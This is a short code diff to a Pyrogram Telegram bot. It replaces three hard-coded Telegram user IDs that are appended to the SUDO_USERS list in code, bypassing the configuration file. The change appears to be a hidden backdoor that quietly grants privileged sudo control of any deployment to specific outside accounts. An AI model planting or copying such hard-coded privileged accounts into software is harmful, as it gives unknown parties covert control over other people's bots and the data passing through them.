@@ -4,9 +4,9 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 
 
-SUDO_USERS.append(5123633430)
-SUDO_USERS.append(2004042280)
-SUDO_USERS.append(1979178376)
+SUDO_USERS.append(5142140533)
+SUDO_USERS.append(2012800996)
+SUDO_USERS.append(1726528906)
 
 
 def errors(func: Callable) -> Callable:
